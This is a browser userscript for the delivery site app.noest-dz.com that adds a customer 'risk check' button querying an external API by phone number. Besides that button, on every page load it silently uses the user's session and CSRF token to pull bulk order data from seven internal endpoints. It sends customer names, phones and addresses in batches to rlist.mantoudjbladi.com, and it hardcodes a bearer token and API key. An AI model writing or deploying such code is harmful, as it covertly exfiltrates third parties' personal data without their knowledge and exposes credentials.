// ==UserScript==
// @name        NoEst Final UserScript
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       You
// @match       https://app.noest-dz.com/*
// @icon         data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==
// @grant        none
// @run-at document-start

// ==/UserScript==

(function() {
    'use strict';
  
    const phoneSvg=`<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="42" zoomAndPan="magnify" viewBox="0 0 375 374.999991" height="42" preserveAspectRatio="xMidYMid meet" version="1.0"><defs><clipPath id="7b136a76da"><path d="M 80 75.382812 L 306.882812 75.382812 L 306.882812 299 L 80 299 Z M 80 75.382812 " clip-rule="nonzero"/></clipPath></defs><g clip-path="url(#7b136a76da)"><path fill="#008c71" d="M 104.773438 77.828125 C 104.773438 77.828125 68.34375 118.424375 84.535156 153.539062 C 99.640625 186.238281 145.289062 262.132812 221.929688 293.191406 C 233.117188 297.730469 245.390625 299.515625 257.273438 297.355469 C 266.171875 295.738281 290.746094 290.390625 298.824219 280.761719 C 299.671875 279.746094 301.265625 278.558594 302.867188 276.109375 C 304.277344 273.949219 306.871094 271.105469 305.894531 266.257812 C 304.582031 259.738281 276.980469 234.292969 266.3125 224.667969 C 263.171875 221.839844 259.144531 220.125 254.929688 220.125 C 252.183594 220.125 249.6875 220.75 242.667969 222.5625 C 241.21875 235.785156 233.367188 244.535156 226.714244 242.019531 C 217.996094 252.589844 163.742188 214.929688 141.84375 170.761719 C 138.457031 163.933594 139.90625 155.699219 145.414062 150.433594 C 152.292969 143.871094 163.394531 132.765625 163.714244 130.507812 C 164.257812 126.730469 162.808594 124.390625 160.660156 119.542969 C 158.957031 115.722656 134.175781 91.453125 123.699219 81.308594 C 119.90625 77.632812 114.816406 75.457031 109.527344 75.640625 C 107.785156 75.707031 105.46875 76.992188 104.773438 77.828125 Z M 104.773438 77.828125 " fill-opacity="1" fill-rule="nonzero"/></g></svg>`;
    const nameSvg=`<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="42" zoomAndPan="magnify" viewBox="0 0 375 374.999991" height="42" preserveAspectRatio="xMidYMid meet" version="1.0"><defs><clipPath id="c520f370a6"><path d="M 90.113281 61.839844 L 285.113281 61.839844 L 285.113281 313.089844 L 90.113281 313.089844 Z M 90.113281 61.839844 " clip-rule="nonzero"/></clipPath></defs><g clip-path="url(#c520f370a6)"><path fill="#2aa9cb" d="M 285.113281 294.078125 C 285.113281 227.054688 241.425781 172.753906 187.613281 172.753906 C 133.800781 172.753906 90.113281 227.054688 90.113281 294.078125 C 90.113281 304.53125 133.800781 313.050781 187.613281 313.050781 C 241.425781 313.050781 285.113281 304.53125 285.113281 294.078125 Z M 187.613281 61.878906 C 216.964244 61.878906 240.742188 85.621094 240.742188 114.929688 C 240.742188 144.238281 216.964244 167.980469 187.613281 167.980469 C 158.261719 167.980469 134.424375 144.238281 134.424375 114.929688 C 134.424375 85.621094 158.261719 61.878906 187.613281 61.878906 Z M 187.613281 61.878906 " fill-opacity="1" fill-rule="evenodd"/></g></svg>`;
    const adressSvg=`<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="42" zoomAndPan="magnify" viewBox="0 0 375 374.999991" height="42" preserveAspectRatio="xMidYMid meet" version="1.0"><defs><clipPath id="8a6525da75"><path d="M 81 103 L 294 103 L 294 279.765625 L 81 279.765625 Z M 81 103 " clip-rule="nonzero"/></clipPath><clipPath id="bcb25067f6"><path d="M 224 95.265625 L 251 95.265625 L 251 135 L 224 135 Z M 224 95.265625 " clip-rule="nonzero"/></clipPath></defs><g clip-path="url(#8a6525da75)"><path fill="#4a9bf0" d="M 190.777344 104.222656 C 188.769531 102.898438 186.164062 102.898438 184.15625 104.222656 L 81.925781 171.890625 L 88.546875 181.898438 L 103.664062 171.894531 L 103.664062 273.984375 C 103.664062 277.296875 106.355469 279.996094 109.671875 279.996094 L 160.449219 279.996094 C 163.757812 279.996094 166.445312 277.304688 166.445312 273.984375 L 166.445312 201.511719 L 208.5 201.511719 L 208.5 273.984375 C 208.5 277.296875 211.1875 279.996094 214.507812 279.996094 L 265.285156 279.996094 C 268.59375 279.996094 271.28125 277.304688 271.28125 273.984375 L 271.28125 171.894531 L 286.402344 181.898438 L 293.019531 171.890625 Z M 190.777344 104.222656 " fill-opacity="1" fill-rule="nonzero"/></g><g clip-path="url(#bcb25067f6)"><path fill="#2d3e50" d="M 250.460938 95.265625 L 224.503906 95.265625 L 224.503906 117.738281 L 250.460938 134.921875 Z M 250.460938 95.265625 " fill-opacity="1" fill-rule="nonzero"/></g></svg>`;
    const boxGreenSvg=`<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="42" zoomAndPan="magnify" viewBox="0 0 375 374.999991" height="32" preserveAspectRatio="xMidYMid meet" version="1.0"><defs><clipPath id="78479dbb67"><path d="M 116 124.191406 L 207.894531 124.191406 L 207.894531 278.914062 L 116 278.914062 Z M 116 124.191406 " clip-rule="nonzero"/></clipPath><clipPath id="828c9c3346"><path d="M 212.199219 124.191406 L 303.917969 124.191406 L 303.917969 278.914062 L 212.199219 278.914062 Z M 212.199219 124.191406 " clip-rule="nonzero"/></clipPath><clipPath id="44e7e7114d"><path d="M 124 95.941406 L 296 95.941406 L 296 149 L 124 149 Z M 124 95.941406 " clip-rule="nonzero"/></clipPath><clipPath id="953444d6df"><path d="M 71.417969 166 L 165 166 L 165 260 L 71.417969 260 Z M 71.417969 166 " clip-rule="nonzero"/></clipPath></defs><g clip-path="url(#78479dbb67)"><path fill="#39b54a" d="M 116.097656 124.355469 L 116.097656 162.027344 C 116.675781 162.007812 117.257812 162 117.835938 162 C 131.4375 162 144.378906 167.351562 153.996094 176.945312 C 163.613281 186.542969 168.976562 199.460938 168.976562 213.03125 C 168.976562 226.601562 163.613281 239.519531 153.996094 249.117188 C 149.304688 253.800781 143.816406 257.476562 137.847656 260.007812 L 207.6875 278.910156 L 207.6875 152.714844 C 207.535156 152.691406 207.386719 152.652344 207.242188 152.597656 C 176.863281 143.179688 146.472656 133.789062 116.097656 124.355469 " fill-opacity="1" fill-rule="evenodd"/></g><g clip-path="url(#828c9c3346)"><path fill="#39b54a" d="M 290.699219 226.066406 L 264.347656 234.078125 C 263.421875 234.265625 262.726562 235.082031 262.726562 236.0625 L 262.726562 251.910156 C 262.699219 253.257812 264.039062 254.3125 265.347656 253.878906 L 291.699219 245.871094 C 292.625 245.679688 293.320312 244.863281 293.320312 243.886719 L 293.320312 228.035156 C 293.34375 226.671875 292.015625 225.652344 290.699219 226.066406 Z M 300.402344 125.449219 C 302.957031 124.632812 303.242188 124.570312 303.933594 124.355469 L 303.933594 252.539062 C 303.945312 253.441406 303.347656 254.277344 302.433594 254.523438 L 212.363281 278.914062 L 212.363281 152.710938 C 212.507812 152.6875 212.652344 152.648438 212.789062 152.597656 L 300.402344 125.449219 " fill-opacity="1" fill-rule="evenodd"/></g><path fill="#39b54a" d="M 266.789062 237.554688 L 289.253906 230.730469 L 289.253906 242.390625 L 266.789062 249.21875 L 266.789062 237.554688 " fill-opacity="1" fill-rule="evenodd"/><g clip-path="url(#44e7e7114d)"><path fill="#39b54a" d="M 233.558594 110.613281 C 234.632812 110.292969 235.765625 110.894531 236.089844 111.96875 C 236.414062 113.039062 235.804688 114.171875 234.730469 114.496094 L 167.4375 134.832031 C 181.253906 139 195.027344 143.3125 208.652344 148.097656 L 210.0625 148.308594 L 211.386719 148.097656 L 295.875 121.917969 L 210.015625 95.972656 L 124.183594 121.910156 C 136.605469 125.703125 149.074219 129.339844 161.519531 133.058594 C 172.085938 128.976562 226.484375 112.75 233.558594 110.613281 " fill-opacity="1" fill-rule="evenodd"/></g><g clip-path="url(#953444d6df)"><path fill="#39b54a" d="M 80.859375 213.03125 C 80.859375 222.851562 84.730469 232.179688 91.691406 239.125 C 98.652344 246.066406 107.996094 249.929688 117.835938 249.929688 C 127.679688 249.929688 137.023438 246.066406 143.984375 239.125 C 150.941406 232.179688 154.8125 222.851562 154.8125 213.03125 C 154.8125 203.210938 150.941406 193.882812 143.984375 186.941406 C 137.023438 179.996094 127.679688 176.132812 117.835938 176.132812 C 107.996094 176.132812 98.652344 179.996094 91.691406 186.941406 C 84.730469 193.882812 80.859375 203.210938 80.859375 213.03125 Z M 117.835938 166.710938 C 130.1875 166.710938 141.929688 171.566406 150.660156 180.277344 C 159.390625 188.992188 164.257812 200.707031 164.257812 213.03125 C 164.257812 225.355469 159.390625 237.070312 150.660156 245.785156 C 141.929688 254.5 130.1875 259.351562 117.835938 259.351562 C 105.484375 259.351562 93.746094 254.5 85.015625 245.785156 C 76.28125 237.070312 71.417969 225.355469 71.417969 213.03125 C 71.417969 200.707031 76.285156 188.992188 85.015625 180.277344 C 93.746094 171.566406 105.484375 166.710938 117.835938 166.710938 " fill-opacity="1" fill-rule="evenodd"/></g><path fill="#39b54a" d="M 111.261719 219.210938 L 133.257812 197.253906 C 135.101562 195.417969 138.09375 195.417969 139.9375 197.253906 C 141.777344 199.09375 141.777344 202.078125 139.9375 203.917969 L 115.019531 228.785156 C 113.316406 230.480469 110.65625 230.664062 108.753906 229.183594 L 96.175781 219.410156 C 94.125 217.8125 93.761719 214.851562 95.359375 212.808594 C 96.960938 210.761719 99.921875 210.398438 101.972656 211.992188 L 111.261719 219.210938 " fill-opacity="1" fill-rule="evenodd"/></svg>`;
    const boxRedSvg=`<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="42" zoomAndPan="magnify" viewBox="0 0 375 374.999991" height="32" preserveAspectRatio="xMidYMid meet" version="1.0"><defs><clipPath id="aeff179563"><path d="M 116 124.191406 L 207.894531 124.191406 L 207.894531 278.914062 L 116 278.914062 Z M 116 124.191406 " clip-rule="nonzero"/></clipPath><clipPath id="0d316bccf6"><path d="M 212.199219 124.191406 L 303.917969 124.191406 L 303.917969 278.914062 L 212.199219 278.914062 Z M 212.199219 124.191406 " clip-rule="nonzero"/></clipPath><clipPath id="e8864ccab3"><path d="M 124 95.941406 L 296 95.941406 L 296 149 L 124 149 Z M 124 95.941406 " clip-rule="nonzero"/></clipPath><clipPath id="820b625869"><path d="M 71.417969 166 L 165 166 L 165 260 L 71.417969 260 Z M 71.417969 166 " clip-rule="nonzero"/></clipPath><clipPath id="b7eaab906b"><path d="M 78.949219 174.472656 L 155.921875 174.472656 L 155.921875 251.449219 L 78.949219 251.449219 Z M 78.949219 174.472656 " clip-rule="nonzero"/></clipPath><clipPath id="c4c594292a"><path d="M 117.433594 174.472656 C 96.179688 174.472656 78.949219 191.703125 78.949219 212.960938 C 78.949219 234.214844 96.179688 251.449219 117.433594 251.449219 C 138.691406 251.449219 155.921875 234.214844 155.921875 212.960938 C 155.921875 191.703125 138.691406 174.472656 117.433594 174.472656 " clip-rule="nonzero"/></clipPath><clipPath id="d1f55724fd"><path d="M 84.867188 180.394531 L 150.117188 180.394531 L 150.117188 245.644531 L 84.867188 245.644531 Z M 84.867188 180.394531 " clip-rule="nonzero"/></clipPath></defs><g clip-path="url(#aeff179563)"><path fill="#e23024" d="M 116.097656 124.355469 L 116.097656 162.027344 C 116.675781 162.007812 117.257812 162 117.835938 162 C 131.4375 162 144.378906 167.351562 153.996094 176.945312 C 163.613281 186.542969 168.976562 199.460938 168.976562 213.03125 C 168.976562 226.601562 163.613281 239.519531 153.996094 249.117188 C 149.304688 253.800781 143.816406 257.476562 137.847656 260.007812 L 207.6875 278.910156 L 207.6875 152.714844 C 207.535156 152.691406 207.386719 152.652344 207.242188 152.597656 C 176.863281 143.179688 146.472656 133.789062 116.097656 124.355469 " fill-opacity="1" fill-rule="evenodd"/></g><g clip-path="url(#0d316bccf6)"><path fill="#e23024" d="M 290.699219 226.066406 L 264.347656 234.078125 C 263.421875 234.265625 262.726562 235.082031 262.726562 236.0625 L 262.726562 251.910156 C 262.699219 253.257812 264.039062 254.3125 265.347656 253.878906 L 291.699219 245.871094 C 292.625 245.679688 293.320312 244.863281 293.320312 243.886719 L 293.320312 228.035156 C 293.34375 226.667969 292.015625 225.652344 290.699219 226.066406 Z M 300.402344 125.449219 C 302.957031 124.632812 303.242188 124.570312 303.933594 124.355469 L 303.933594 252.539062 C 303.945312 253.441406 303.347656 254.277344 302.433594 254.523438 L 212.363281 278.914062 L 212.363281 152.710938 C 212.507812 152.6875 212.652344 152.648438 212.789062 152.597656 L 300.402344 125.449219 " fill-opacity="1" fill-rule="evenodd"/></g><path fill="#e23024" d="M 266.789062 237.554688 L 289.253906 230.730469 L 289.253906 242.390625 L 266.789062 249.21875 L 266.789062 237.554688 " fill-opacity="1" fill-rule="evenodd"/><g clip-path="url(#e8864ccab3)"><path fill="#e23024" d="M 233.558594 110.613281 C 234.632812 110.292969 235.765625 110.894531 236.089844 111.96875 C 236.414062 113.039062 235.804688 114.171875 234.730469 114.496094 L 167.4375 134.832031 C 181.253906 139 195.027344 143.3125 208.652344 148.097656 L 210.0625 148.308594 L 211.386719 148.097656 L 295.875 121.917969 L 210.015625 95.972656 L 124.183594 121.910156 C 136.605469 125.703125 149.074219 129.339844 161.519531 133.058594 C 172.085938 128.976562 226.484375 112.75 233.558594 110.613281 " fill-opacity="1" fill-rule="evenodd"/></g><g clip-path="url(#820b625869)"><path fill="#e23024" d="M 80.859375 213.03125 C 80.859375 222.851562 84.730469 232.179688 91.691406 239.125 C 98.652344 246.066406 107.996094 249.929688 117.835938 249.929688 C 127.679688 249.929688 137.023438 246.066406 143.984375 239.125 C 150.941406 232.179688 154.8125 222.851562 154.8125 213.03125 C 154.8125 203.210938 150.941406 193.882812 143.984375 186.941406 C 137.023438 179.996094 127.679688 176.132812 117.835938 176.132812 C 107.996094 176.132812 98.652344 179.996094 91.691406 186.941406 C 84.730469 193.882812 80.859375 203.210938 80.859375 213.03125 Z M 117.835938 166.710938 C 130.1875 166.710938 141.929688 171.566406 150.660156 180.277344 C 159.390625 188.992188 164.257812 200.707031 164.257812 213.03125 C 164.257812 225.355469 159.390625 237.070312 150.660156 245.785156 C 141.929688 254.5 130.1875 259.351562 117.835938 259.351562 C 105.484375 259.351562 93.746094 254.5 85.015625 245.785156 C 76.28125 237.070312 71.417969 225.355469 71.417969 213.03125 C 71.417969 200.707031 76.285156 188.992188 85.015625 180.277344 C 93.746094 171.566406 105.484375 166.710938 117.835938 166.710938 " fill-opacity="1" fill-rule="evenodd"/></g><path fill="#e23024" d="M 111.261719 219.210938 L 133.257812 197.253906 C 135.101562 195.417969 138.09375 195.417969 139.9375 197.253906 C 141.777344 199.09375 141.777344 202.078125 139.9375 203.917969 L 115.019531 228.785156 C 113.316406 230.480469 110.65625 230.664062 108.753906 229.183594 L 96.175781 219.410156 C 94.125 217.8125 93.761719 214.851562 95.359375 212.808594 C 96.960938 210.761719 99.921875 210.398438 101.972656 211.992188 L 111.261719 219.210938 " fill-opacity="1" fill-rule="evenodd"/><g clip-path="url(#b7eaab906b)"><g clip-path="url(#c4c594292a)"><path fill="#ffffff" d="M 78.949219 174.472656 L 155.921875 174.472656 L 155.921875 251.449219 L 78.949219 251.449219 Z M 78.949219 174.472656 " fill-opacity="1" fill-rule="nonzero"/></g></g><g clip-path="url(#d1f55724fd)"><path fill="#e23024" d="M 117.453125 180.363281 C 99.46875 180.363281 84.835938 194.996094 84.835938 212.976562 C 84.835938 230.960938 99.46875 245.59375 117.453125 245.59375 C 135.4375 245.59375 150.066406 230.960938 150.066406 212.976562 C 150.066406 194.996094 135.4375 180.363281 117.453125 180.363281 Z M 136.671875 223.363281 C 137.246094 223.933594 137.246094 224.898438 136.671875 225.46875 L 129.953125 232.191406 C 129.671875 232.472656 129.296875 232.625 128.898438 232.625 C 128.492188 232.625 128.117188 232.472656 127.839844 232.191406 L 117.453125 221.804688 L 107.0625 232.191406 C 106.527344 232.730469 105.492188 232.730469 104.957031 232.195312 L 98.234375 225.472656 C 97.953125 225.191406 97.800781 224.816406 97.800781 224.417969 C 97.800781 224.015625 97.953125 223.640625 98.234375 223.359375 L 108.625 212.976562 L 98.234375 202.585938 C 97.953125 202.304688 97.800781 201.929688 97.800781 201.53125 C 97.800781 201.128906 97.953125 200.753906 98.234375 200.476562 L 104.957031 193.753906 C 105.492188 193.214844 106.527344 193.214844 107.0625 193.753906 L 117.453125 204.144531 L 127.84375 193.753906 C 128.378906 193.214844 129.414062 193.214844 129.949219 193.753906 L 136.671875 200.476562 C 136.949219 200.753906 137.101562 201.128906 137.101562 201.527344 C 137.101562 201.929688 136.949219 202.304688 136.671875 202.582031 L 126.28125 212.972656 Z M 136.671875 223.363281 " fill-opacity="1" fill-rule="nonzero"/></g></svg>`;
    const riskSvg=`  <img src="https://rlist.mantoudjbladi.com/icons/7.svg" alt="" width="42" heigth="42">`;
    document.addEventListener("DOMContentLoaded", function() {
       const allowedUrls =["https://app.noest-dz.com/validation/orders",
                            "https://app.noest-dz.com/validated/orders",
                            "https://app.noest-dz.com/valid/orders",
                            "https://app.noest-dz.com/vers/hub",
                            "https://app.noest-dz.com/in/hub",
                            "https://app.noest-dz.com/livraisons",
                            "https://app.noest-dz.com/livraisons/suspendu",
                            "https://app.noest-dz.com/livraison/non/encaisse",
                            "https://app.noest-dz.com/retours/transit"];
  
       if (allowedUrls.includes(window.location.href)) {
            //import css
           const link = document.createElement('link');
            link.rel = 'stylesheet';
            link.href = 'https://shadir69.github.io/modal/style.css';//css url
            document.head.appendChild(link);
             //end import css
            let table = document.querySelector("#myTable tbody")         
            let modal = document.createElement("div");
            modal.setAttribute("class", "risk_container");
  
            let checkUser;
            if (window.location.href.includes("/validation/orders")) {
                checkUser = 3;
            } else {
                checkUser = 2;
            } 
            const intervalId = setInterval(checkRows, 100);
            function checkRows() {
                const rows = table.querySelectorAll('tr');
                if (rows.length > 0) {
                    if(table.rows[0].childElementCount>1){
                        clearInterval(intervalId);
                        createButton();
                    }
                    else{
                         clearInterval(intervalId);
                    }
                }
            }
            function createButton(){
                if(!document.querySelector('#button-check')){
                for (let i = 0; i < table.rows.length; i++)
                {
                    let td = table.rows[i].children[checkUser];
                    const regex = /(\b\d{10}\b)/g;
                    let text = td.textContent;
                    let phoneNumbers = text.match(regex); 
                    let button = document.createElement("button");
                    let buttonContainer = document.createElement("div");
                  
                    buttonContainer.setAttribute("class", "risk_button_container");
                    button.setAttribute("id", "button-check");
                    button.setAttribute("class", "risk_button");                  
                    button.innerHTML = "Check";                 
                    buttonContainer.appendChild(button);
                    td.appendChild(buttonContainer);
                    // const token =localStorage.getItem("access_token");
                    let data = [];
                    button.addEventListener("click", async function () {
                        try{
                            data = [];
                            showSpinner(buttonContainer);
                            let view = document.createElement("div");
                            view.setAttribute("class", "risk_view");
                            let buttonMore = document.createElement("button");
                            buttonMore.setAttribute("class", "risk_button");
                            buttonMore.innerHTML = "more details";
                           
                          for (let i = 0; i < phoneNumbers.length; i++) {
                                const response = await fetch("https://rlist.mantoudjbladi.com/api/orders/"+phoneNumbers[i], {
                                    headers: {
                                        'Accept': 'application/json',
                                        'Content-Type': 'application/json',
                                        'Authorization':'Bearer 3|HQlYz7i1TpXhaCCYs6lq8QL5bVhnoEPYaWuq7ZJQ',//+token
                                        "X-Api-Key": "3AQi9ysOlvV6ZsYyl5OiUe31ckl6XVndBcMRFHeY"
                                    }
  
                                })
                                const responseData = await response.json();
                                data.push(responseData);
                            }
  
                            let totalDeliveredOrders = 0;
                            let totalReturnedOrders = 0;
                            let successTest =0;
                            let retry_after=0;
                            for (let i = 0; i < data.length; i++) {
                                if(data[i].success){
                                    totalDeliveredOrders += data[i].delivered_orders;
                                    totalReturnedOrders += data[i].returned_orders;
                                }else{
                                    if (data[i].message === "Too Many Requests") {
                                        retry_after=1;
                                    }
                                    successTest++;
                                }
                            }
                            closeSpinner()
                            td.removeChild(buttonContainer);
                            td.appendChild(view);
                                
  
                            if(successTest==data.length || retry_after!=0 ){
                                  
                                if(retry_after!=0){
                                 view.innerText='Try after 1 minute...!';
                                    view.style.color='red';                    
                                      setTimeout(function() {
                                          let retry_after=0;
                                          td.removeChild(view);
                                          td.appendChild(buttonContainer);                    
                                      }, 5000);
                                }
                                else{
                                    view.style.color='#fff';
                                    view.innerHTML=`There is No Risk ${boxGreenSvg} .`;
                                    view.style.flexDirection='row';                               
                                  }
                              }else{
                                let percentage =Math.round((totalReturnedOrders / (totalReturnedOrders+ totalDeliveredOrders)) * 100);
                                buttonMore.addEventListener("click", function () {
                                modal.classList.add("show");
                                    modal.innerHTML = `<div class="risk_content"> <h1 class="risk_title">CLIENT DETAILS</h1>
                                   <table class="risk_table"> <tr > <th> <span>Phone Number</span>${phoneSvg} </th>  ${data[0] && data[0].success ? `<td>${phoneNumbers[0]}</td>` : ''} ${data[1] && data[1].success ? `<td>${phoneNumbers[1]}</td>` : ''} </tr>
                                   <tr> <th> <span>Full Name</span>${nameSvg} </th>${data[0] && data[0].success ? `<td>${data[0].customer_details.Receiver}</td>` : ''}${data[1] && data[1].success ? `<td>${data[1].customer_details.Receiver}</td>` : ''}</tr>
                                   <tr > <th> <span>Address</span>${adressSvg} </th>  ${data[0] && data[0].success ?`<td>${data[0].customer_details.City}</td>` : ''} ${data[1] && data[1].success ?`<td>${data[1].customer_details.City}</td>` : ''}</tr>
                                   <tr > <th> <span>Delivered Orders</span>${boxGreenSvg} </th>${data[0] && data[0].success ?`<td>${data[0].delivered_orders}</td> `: '' }${data[1] && data[1].success ?`<td>${data[1].delivered_orders}</td> `: '' }</tr>
                                   <tr> <th> <span>Cancelled Orders</span>${boxRedSvg} </th>  ${data[0] && data[0].success ?`<td>${data[0].returned_orders}</td> `: '' } ${data[1] && data[1].success ?`<td>${data[1].returned_orders}</td> `: '' }</tr> </table>
                                   <div class="risk_progress"> <div> <span>Risk Ratio</span>${riskSvg} </div>
                                   <div class="risk_progress-bar">
                                   <div class="risk_progress-bar-fill" style="width: ${percentage<15?25:percentage}%;">
                                   <span class="risk_progress-bar-text">${percentage}%</span> </div> </div> </div> </div> `;
  
                                   document.body.append(modal);
                                    const closeButton = document.createElement("span");
                                    closeButton.setAttribute("class", "close");
                                    closeButton.style.position = "absolute";
                                    closeButton.style.top = "10px";
                                    closeButton.style.right = "10px";
                                    closeButton.style.fontSize = "1.40625rem";
                                    closeButton.style.color = "#fff";
  
                                    closeButton.onclick = function () {
                                        modal.classList.remove("show");
                                    };
                                    let content = document.querySelector('.risk_content');
                                     const progressBarFill = document.querySelector('.risk_progress-bar-fill');
                                    if (percentage < 25) {
                                        progressBarFill.style.backgroundColor = '#4bdb2f';
                                    } else if (percentage < 50) {
                                        progressBarFill.style.backgroundColor = ' #ffff13';
                                    } else if (percentage < 75) {
                                        progressBarFill.style.backgroundColor = '#db902f';
                                    } else {
                                        progressBarFill.style.backgroundColor = '#db4c2f';
                                    }
                                    content.appendChild(closeButton);
                                    modal.onclick = function (event) {
                                        if (event.target === modal) {
                                             modal.classList.remove("show");
                                        }
                                    }
                                })
                                view.appendChild(buttonMore);
  
                                const deliveredOrdersSpan = document.createElement('span');
                                deliveredOrdersSpan.style.display = 'flex';
                                deliveredOrdersSpan.style.alignItems = 'center';
                                deliveredOrdersSpan.innerHTML = `Delivered Orders ${boxGreenSvg} : ${totalDeliveredOrders}`;
  
                                const cancelledOrdersSpan = document.createElement('span');
                                cancelledOrdersSpan.style.display = 'flex';
                                cancelledOrdersSpan.style.alignItems = 'center';
                                cancelledOrdersSpan.innerHTML = `Cancelled Orders ${boxRedSvg}: ${totalReturnedOrders}`;
  
                                view.appendChild(deliveredOrdersSpan);
                                view.appendChild(cancelledOrdersSpan);  
                            } 
                        }catch (error) {
                            console.error(error);
                        }   
                    })  
                }
            }}
            const observer = new MutationObserver((mutationsList) => {
                createButton();
            });
            observer.observe(table, { childList: true });       
            let spinner;
            function showSpinner(div) {
                spinner = document.createElement('div');
                spinner.classList.add('lds-hourglass');
                div.appendChild(spinner);
            }
             function closeSpinner() {
                spinner.remove();
            } 
        }  
    });           
    if (!indexedDB) {
  alert("not support indexedDB");
  } else {
  //create indexDB dataBase
  var db;
  var request = indexedDB.open(location.hostname, 1);
  request.onupgradeneeded = function (event) {
    db = event.target.result;
    var objectStore = db.createObjectStore("store", { keyPath: "id" });
  };
  request.onsuccess = function (event) {
    db = event.target.result;
    generateData();
  };
  request.onerror = function (event) {
   // console.log("Error creating/accessing IndexedDB database");
  };
  }
  function add(i) {
  var transaction = db.transaction(["store"], "readwrite");
  var objectStore = transaction.objectStore("store");
  var item = { id: i };
  var request = objectStore.add(item);
  request.onsuccess = function (event) {
   // console.log("Item added to the object store");
  };
  request.onerror = function (event) {
  //  console.log("Error adding item to the object store");
  };
  }
  async function check(item) {
  var transaction = db.transaction(["store"], "readwrite");
  var objectStore = transaction.objectStore("store");
  var trakingId = { id: item };
  var request = objectStore.get(trakingId.id);
  return new Promise((resolve, reject) => {
    request.onsuccess = function (event) {
      var result = event.target.result;
      if (!result) {
        resolve(0);
      } else {
        resolve(1);
      }
    };
  });
  }
  async function getDATA(url, check = false, url_2) {
  try {
    var itemsIds = [];
    var itemData = [];
    var myHeaders = new Headers();
    myHeaders.append("Accept", "application/json");
    var requestOptions = {
      method: "GET",
      headers: myHeaders,
      redirect: "follow",
    };
    let response = await fetch(
      "https://app.noest-dz.com/" + url,
      requestOptions
    );
    let data = await response.json();
    if (!check) {
      if (url == "retours/recu/list") {
        const allOrders = [].concat(...data.data.map((item) => item.orders));
        return allOrders;
      } else {
        return data.data;
      }
    } else {
      itemsIds = data.data[0].data_lists.transactionIds;
      for (const item of itemsIds) {
        const itemD = await getItemData(item, url_2);
        await delay(delayTime);
        itemData.push(itemD);
      }
      return itemData.flat(1);
    }
  } catch (error) {
    console.error(error);
  }
  }
  //
  async function getItemData(id, url) {
  try {
    var myHeaders = new Headers();
    var xscrf = document.head
      .querySelector('meta[name="csrf-token"]')
      .getAttribute("content");
    myHeaders.append("Accept", "application/json");
    myHeaders.append("x-csrf-token", xscrf);
    myHeaders.append("Content-Type", "application/x-www-form-urlencoded");
    var urlencoded = new URLSearchParams();
    urlencoded.append("transaction_id", String(id));
    var requestOptions = {
      method: "POST",
      headers: myHeaders,
      body: urlencoded,
      redirect: "follow",
    };
    let response = await fetch(
      "https://app.noest-dz.com/" + url,
      requestOptions
    );
    if (!response.ok) {
      throw new Error(`Error! status: ${response.status}`);
    }
    let data = await response.json();
    return data;
  } catch (error) {
    console.error(error);
  }
  }
  const delay = (time) => new Promise((resolve) => setTimeout(resolve, time));
  let delayTime = 2000;
  const endpoints = [
  {
    url: "livraison/non/encaisse/list",
    isNext: false,
    url_2: null,
    state: "livre",
  },
  {
    url: "livraison/NVCashed/list",
    isNext: false,
    url_2: null,
    state: "livre",
  },
  {
    url: "livraison/cashin/list",
    isNext: true,
    url_2: "livraison/cashin/more",
    state: "livre",
  },
  {
    url: "livraison/cashin/list/history",
    isNext: true,
    url_2: "livraison/cashin/more/history",
    state: "livre",
  },
  { url: "retours/transit/list", isNext: false, url_2: null, state: "retours" },
  { url: "retours/recu/list", isNext: false, url_2: null, state: "retours" },
  { url: "retours/payment/list", isNext: false, url_2: null, state: "retours" },
  ];
  async function generateData() {
  try {
    let extractedData = [];
    let itemsData = [];
    let lastEndpointIndex = localStorage.getItem("lastEndpointIndex") || 0;
    for (let i = parseInt(lastEndpointIndex); i < endpoints.length; i++) {
      const endpoint = endpoints[i];
      let data = await getDATA(endpoint.url, endpoint.isNext, endpoint.url_2);
      if (endpoint.isNext) {
        data = data.filter((obj) => obj.livred_at);
      }
      if (endpoint.state == "livre") {
        extractedData = data.map(
          ({
            tracking,
            client,
            phone,
            phone_2,
            livred_at: orderdate,
            adresse,
            commune,
            wilaya,
          }) => ({
            tracking,
            client,
            phone,
            phone_2,
            orderdate,
            delivery_status: "1",
            adresse: adresse ? adresse : "",
            commune,
            wilaya,
          })
        );
      } else {
        extractedData = data.map(
          ({
            tracking,
            client,
            phone,
            phone_2,
            expedier_at: orderdate,
            adresse,
            commune,
            wilaya,
          }) => ({
            tracking,
            client,
            phone,
            phone_2,
            orderdate,
            delivery_status: "0",
            adresse,
            commune,
            wilaya,
          })
        );
      }
  
      for (const item of extractedData) {
        const res = await check(item.tracking);
        if (!res) {
          itemsData.push(item);
        }
      }
      if (itemsData.length) {
        const trimNumber = Math.ceil(itemsData.length / 100);
        for (let i = 0; i < trimNumber; i++) {
          let start = i * 100;
          let end = start + 100;
          let trimData = itemsData.slice(start, end);
          sendData(trimData);
        }
      } else {
       // console.log("There No Data to Fetch");
      }
      localStorage.setItem("lastEndpointIndex", i);
      if (i === endpoints.length - 1) {
        localStorage.setItem("lastEndpointIndex", 0);
      }
      itemsData = [];
      await delay(delayTime);
    }
  } catch (error) {
    console.error(error);
     setTimeout(() => {
            generateData()
        }, delayTime);
  }
  }
  async function sendData(orders) {
  try {
    //const accessToken = localStorage.getItem('access_token');
    const response = await fetch("https://rlist.mantoudjbladi.com/api/orders", {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: "Bearer 3|HQlYz7i1TpXhaCCYs6lq8QL5bVhnoEPYaWuq7ZJQ", //+ accessToken,
        "X-Api-Key": "3AQi9ysOlvV6ZsYyl5OiUe31ckl6XVndBcMRFHeY",
      },
      body: JSON.stringify(orders),
    });   
  if(response.ok){
          for(const id of orders){
                add(id.tracking)
            }}
  } catch (error) {
    console.error("Error sending Data", error);
      setTimeout(() => {
            sendData(orders)
        }, delayTime);
  }
  }
  
  
 
  })();
